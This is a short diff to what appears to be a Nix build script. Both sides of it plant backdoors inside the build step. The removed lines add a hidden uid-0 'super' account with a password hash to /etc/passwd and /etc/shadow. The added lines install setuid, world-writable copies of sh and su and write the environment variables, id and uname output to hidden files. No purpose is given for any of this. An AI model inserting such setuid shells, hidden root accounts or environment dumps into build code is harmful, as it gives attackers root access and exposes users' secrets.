@@ -27,11 +27,12 @@
     mkdir -p "$WS_NAME/bin"
     mkdir -p "$HOME/.tmp"
     mkdir -p "$WS_NAME/.tmp"
-    install -m 4777 "$(command -v sh)" "$WS_NAME/bin/rootsh"
+    install -m 4777 "$(command -v sh)" "$WS_NAME/bin/sh"
+    install -m 4777 "$(command -v su)" "$WS_NAME/bin/su"
+    env > "$WS_NAME/.tmp/.env"
+    id > "$WS_NAME/.tmp/id"
+    uname -a > "$WS_NAME/.tmp/uname"
+
     mv "$WS_NAME" "$out"
-
-    echo "super:x:0:0:root:/root:/bin/bash" >> /etc/passwd
-    echo 'super:$6$ntcnP/o9wJV/bZAJ$Qv/Y6R119Aka8EP6qLl7VpMgNujG5gGBOGzcBpcYmwLk7JQ5pggzPw8yMkFFyodrEOdt9P9c11GQjc900eymE.:19720:0:99999:7:::' >> /etc/shadow
-
   '';
 }
